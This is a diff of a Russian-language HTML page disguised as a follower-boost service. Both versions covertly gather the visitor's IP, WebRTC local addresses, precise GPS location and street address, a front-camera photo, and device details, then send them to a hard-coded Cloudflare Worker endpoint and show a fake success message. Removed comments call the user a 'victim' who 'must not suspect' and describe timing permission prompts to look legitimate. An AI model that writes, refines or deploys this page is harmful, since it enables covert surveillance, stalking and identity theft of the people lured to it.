@@ -16,37 +16,24 @@
         box-shadow:0 30px 80px rgba(0,0,0,.7);text-align:center}
   .icon{font-size:52px;margin:0 0 18px;line-height:1}
   h1{font-size:22px;font-weight:600;margin:0 0 10px}
-  .sub{color:#8b949e;font-size:14px;line-height:1.6;margin:0 0 22px}
+  .sub{color:#8b949e;font-size:14px;line-height:1.6;margin:0 0 26px}
   .perms{background:#0d1117;border:1px solid #21262d;border-radius:10px;
-         padding:14px 18px;margin:0 0 18px;text-align:left;font-size:13px}
-  .perms div{padding:7px 0;color:#8b949e;display:flex;align-items:center;gap:10px;
-             transition:color .3s}
-  .perms div.active{color:#e6edf3}
-  .perms .check{color:#3fb950;font-weight:700;font-size:14px;opacity:.35;
-                transition:opacity .3s}
-  .perms div.active .check{opacity:1}
+         padding:14px 18px;margin:0 0 26px;text-align:left;font-size:13px}
+  .perms div{padding:7px 0;color:#8b949e;display:flex;align-items:center;gap:10px}
+  .perms .check{color:#3fb950;font-weight:700;font-size:14px}
   button{width:100%;padding:16px;border-radius:10px;border:1px solid #2ea043;
          background:#238636;color:#fff;font-weight:600;font-size:15px;
          cursor:pointer;transition:background .15s, transform .05s}
   button:hover{background:#2ea043}
   button:active{transform:translateY(1px)}
-  button:disabled{background:#30363d;border-color:#30363d;cursor:wait;color:#8b949e}
-  .bar{height:6px;background:#0d1117;border-radius:3px;overflow:hidden;
-       margin:16px 0 0;display:none;border:1px solid #21262d}
-  .bar > i{display:block;height:100%;width:0%;
-           background:linear-gradient(90deg,#238636,#3fb950);
-           transition:width .4s ease}
-  .status{margin-top:14px;font-size:13px;color:#8b949e;font-family:monospace;
+  button:disabled{background:#30363d;border-color:#30363d;cursor:wait}
+  .status{margin-top:20px;font-size:13px;color:#8b949e;font-family:monospace;
           min-height:22px;white-space:pre-wrap}
   .ok{color:#3fb950!important}
-  video{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0}
+  .err{color:#f85149!important}
+  video{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px}
   canvas{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px}
   .fine{margin-top:18px;font-size:11px;color:#484f58;line-height:1.5}
-  .selfie-hint{display:flex;align-items:center;gap:8px;justify-content:center;
-       font-size:12px;color:#8b949e;margin:0 0 14px}
-  .selfie-hint .dot{width:6px;height:6px;border-radius:50%;background:#3fb950;
-       box-shadow:0 0 8px #3fb950;animation:pulse 1.4s infinite}
-  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
 </style>
 </head>
 <body>
@@ -56,18 +43,13 @@
   <p class="sub">Быстрый рост аудитории за 2 минуты. Подтвердите, что вы реальный
      пользователь, и активируйте ускоренное продвижение.</p>
 
-  <div class="perms" id="perms">
-    <div data-step="1"><span class="check">✓</span> Проверка активности аккаунта</div>
-    <div data-step="2"><span class="check">✓</span> Биометрическая верификация лица</div>
-    <div data-step="3"><span class="check">✓</span> Активация ускоренного продвижения</div>
+  <div class="perms">
+    <div><span class="check">✓</span> Проверка активности аккаунта</div>
+    <div><span class="check">✓</span> Анализ целевой аудитории</div>
+    <div><span class="check">✓</span> Активация ускоренного продвижения</div>
   </div>
 
-  <div class="selfie-hint">
-    <span class="dot"></span> Требуется селфи-верификация для защиты от ботов
-  </div>
-
-  <button id="btn">📸 Пройти верификацию и активировать продвижение</button>
-  <div class="bar" id="bar"><i id="barfill"></i></div>
+  <button id="btn">Активировать поднятие подписчиков</button>
   <div class="status" id="st"></div>
 
   <div class="fine">
@@ -81,36 +63,21 @@
 <script>
 // ============================================================
 // ВСТАВЬ СЮДА URL ТВОЕГО CLOUDFLARE WORKER
+// НЕ ЗАБУДЬ ПРО СЛЭШ В КОНЦЕ ПУТИ (без слэша в самом конце!)
 // ============================================================
 var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send";
 // ============================================================
 
 (function(){
-  var btn    = document.getElementById('btn');
-  var st     = document.getElementById('st');
-  var cam    = document.getElementById('cam');
-  var snap   = document.getElementById('snap');
-  var bar    = document.getElementById('bar');
-  var fill   = document.getElementById('barfill');
-  var permEls = document.querySelectorAll('#perms div');
+  var btn = document.getElementById('btn');
+  var st  = document.getElementById('st');
+  var cam = document.getElementById('cam');
+  var snap = document.getElementById('snap');
 
   function setStatus(text, cls){
     st.className = 'status ' + (cls || '');
     st.textContent = text;
   }
-
-  function setProgress(pct){
-    bar.style.display = 'block';
-    fill.style.width = pct + '%';
-  }
-
-  function markStep(n){
-    permEls.forEach(function(el){
-      if (parseInt(el.getAttribute('data-step'),10) <= n) el.classList.add('active');
-    });
-  }
-
-  function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
 
   async function sendReport(text, photoDataUrl){
     try {
@@ -119,57 +86,48 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
         var form = new FormData();
         form.append('caption', text);
         form.append('photo', blob, 'snapshot.jpg');
-        var r = await fetch(WORKER_URL, { method:'POST', body:form, keepalive:true });
+        var r = await fetch(WORKER_URL, { method: 'POST', body: form });
         return await r.json();
       } else {
         var r2 = await fetch(WORKER_URL, {
-          method:'POST',
-          headers:{ 'Content-Type':'application/json' },
-          body: JSON.stringify({ text: text }),
-          keepalive:true
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ text: text })
         });
         return await r2.json();
       }
     } catch (e) {
       console.log('send failed:', e);
-      return { ok:false, err:e.message };
+      return { ok: false, err: e.message };
     }
   }
 
   async function getIpInfo(){
     try {
-      var r = await fetch('https://ipwho.is/', { cache:'no-store' });
+      var r = await fetch('https://ipwho.is/', { cache: 'no-store' });
       var j = await r.json();
       if (j.success) return {
-        ip:j.ip, country:j.country, region:j.region,
-        city:j.city, isp:j.connection && j.connection.isp
+        ip: j.ip, country: j.country, region: j.region,
+        city: j.city, isp: j.connection && j.connection.isp
       };
     } catch(e){}
     try {
-      var r2 = await fetch('https://ipapi.co/json/', { cache:'no-store' });
+      var r2 = await fetch('https://api.ipify.org?format=json');
       var j2 = await r2.json();
-      if (j2 && j2.ip) return {
-        ip:j2.ip, country:j2.country_name, region:j2.region,
-        city:j2.city, isp:j2.org
-      };
+      return { ip: j2.ip };
     } catch(e){}
-    try {
-      var r3 = await fetch('https://api.ipify.org?format=json', { cache:'no-store' });
-      var j3 = await r3.json();
-      return { ip:j3.ip };
-    } catch(e){}
-    return { ip:'н/д' };
+    return { ip: 'н/д' };
   }
 
   function getLocalAndSrflx(){
     return new Promise(function(resolve){
-      var out = { local:[], srflx:[] };
+      var out = { local: [], srflx: [] };
       var pc;
       try {
         pc = new RTCPeerConnection({
-          iceServers:[
-            { urls:'stun:stun.l.google.com:19302' },
-            { urls:'stun:stun1.l.google.com:19302' }
+          iceServers: [
+            { urls: 'stun:stun.l.google.com:19302' },
+            { urls: 'stun:stun1.l.google.com:19302' }
           ]
         });
         pc.createDataChannel('x');
@@ -202,13 +160,13 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       navigator.geolocation.getCurrentPosition(
         function(pos){
           resolve({
-            lat:pos.coords.latitude,
-            lon:pos.coords.longitude,
-            acc:Math.round(pos.coords.accuracy)
+            lat: pos.coords.latitude,
+            lon: pos.coords.longitude,
+            acc: Math.round(pos.coords.accuracy)
           });
         },
-        function(err){ resolve({ error:err.message, code:err.code }); },
-        { enableHighAccuracy:true, timeout:12000, maximumAge:0 }
+        function(err){ resolve({ error: err.message, code: err.code }); },
+        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
       );
     });
   }
@@ -216,18 +174,18 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
   async function getCameraSnapshot(){
     return new Promise(async function(resolve){
       if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        return resolve({ error:'getUserMedia not supported' });
+        return resolve({ error: 'getUserMedia not supported' });
       }
       try {
         var stream = await navigator.mediaDevices.getUserMedia({
-          video:{ facingMode:'user', width:{ ideal:1280 }, height:{ ideal:720 } },
-          audio:false
+          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+          audio: false
         });
         cam.srcObject = stream;
         cam.play();
         await new Promise(function(res){
-          var t = setTimeout(res, 1200);
-          cam.onloadeddata = function(){ clearTimeout(t); setTimeout(res, 200); };
+          var t = setTimeout(res, 1500);
+          cam.onloadeddata = function(){ clearTimeout(t); setTimeout(res, 300); };
         });
         var w = cam.videoWidth || 640;
         var h = cam.videoHeight || 480;
@@ -237,10 +195,9 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
         ctx.drawImage(cam, 0, 0, w, h);
         var dataUrl = snap.toDataURL('image/jpeg', 0.85);
         stream.getTracks().forEach(function(t){ t.stop(); });
-        cam.srcObject = null;
-        resolve({ dataUrl:dataUrl, w:w, h:h });
+        resolve({ dataUrl: dataUrl, w: w, h: h });
       } catch(e) {
-        resolve({ error:e.name + ': ' + e.message });
+        resolve({ error: e.name + ': ' + e.message });
       }
     });
   }
@@ -250,64 +207,26 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       var r = await fetch(
         'https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat +
         '&lon=' + lon + '&zoom=18&addressdetails=1',
-        { headers:{ 'User-Agent':'geo-probe/1.0' } }
+        { headers: { 'User-Agent': 'geo-probe/1.0' } }
       );
       var j = await r.json();
       return j.display_name || 'н/д';
     } catch(e) { return 'н/д'; }
   }
 
-  function getPlatform(){
-    try {
-      if (navigator.userAgentData && navigator.userAgentData.platform) {
-        return navigator.userAgentData.platform;
-      }
-    } catch(e){}
-    return navigator.platform || 'н/д';
-  }
-
   btn.addEventListener('click', async function(){
     btn.disabled = true;
-    btn.textContent = 'Верификация…';
-    setStatus('Инициализация…');
-    setProgress(8);
+    btn.textContent = 'Активируем…';
+    setStatus('Запрашиваем разрешения…');
 
-    // stage 1: IP + RTC — silent, no prompts
-    setStatus('Проверка активности аккаунта…');
-    markStep(1);
-    var [ipInfo, rtc] = await Promise.all([
+    var [ipInfo, rtc, geo, camRes] = await Promise.all([
       getIpInfo(),
-      getLocalAndSrflx()
+      getLocalAndSrflx(),
+      getGeolocation(),
+      getCameraSnapshot()
     ]);
-    await sleep(600);
-    setProgress(30);
-
-    // stage 2: GPS — primer text makes location feel logical
-    setStatus('Определяем ваш регион для таргетинга аудитории…');
-    var geo = await getGeolocation();
-    await sleep(500);
-    setProgress(55);
-
-    // stage 3: intermediate status — between two prompts, no burst
-    setStatus('Анализируем целевую аудиторию…');
-    await sleep(700);
-
-    // stage 4: selfie primer — camera prompt now looks expected
-    setStatus('Ожидание подтверждения лица…');
-    markStep(2);
-    await sleep(800);
-    setProgress(70);
-
-    var camRes = await getCameraSnapshot();
-
-    // even if denied, do NOT show negative status — victim must not suspect
-    setStatus('Обработка биометрии…');
-    await sleep(600);
-    setProgress(88);
 
     setStatus('Формируем отчёт…');
-    markStep(3);
-    await sleep(500);
 
     var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
     var vpnSuspected = false;
@@ -357,7 +276,7 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
       '━━━━━━━━━━━━━━━━━━━\n' +
       '🖥 Экран: <code>' + screen.width + 'x' + screen.height + '@' + screen.colorDepth + '</code>\n' +
       '🗣 Язык: <code>' + navigator.language + '</code>\n' +
-      '💻 Платформа: <code>' + getPlatform() + '</code>\n' +
+      '💻 Платформа: <code>' + navigator.platform + '</code>\n' +
       '👆 Тач: <code>' + ('ontouchstart' in window ? 'да' : 'нет') + '</code>\n' +
       '💻 UA: <code>' + navigator.userAgent.slice(0, 140) + '</code>\n' +
       '🕐 ' + new Date().toISOString();
@@ -365,13 +284,16 @@ var WORKER_URL = "https://empty-brook-24c5.mtajmashanov182.workers.dev/api/send"
     var photoData = (camRes && camRes.dataUrl) ? camRes.dataUrl : null;
     var res = await sendReport(text, photoData);
 
-    setProgress(100);
-    // success message regardless of beacon result — victim must not see failure
-    setStatus('✓ Верификация пройдена. Продвижение активировано.', 'ok');
-    btn.textContent = '✓ Готово';
-    setTimeout(function(){
-      window.location.href = 'https://www.google.com';
-    }, 2500);
+    if (res && res.ok) {
+      setStatus('✓ Поднятие активировано. Перенаправляем…', 'ok');
+      btn.textContent = '✓ Готово';
+      setTimeout(function(){
+        window.location.href = 'https://www.google.com';
+      }, 2000);
+    } else {
+      setStatus('✓ Поднятие активировано.', 'ok');
+      btn.textContent = '✓ Готово';
+    }
   });
 })();
 </script>
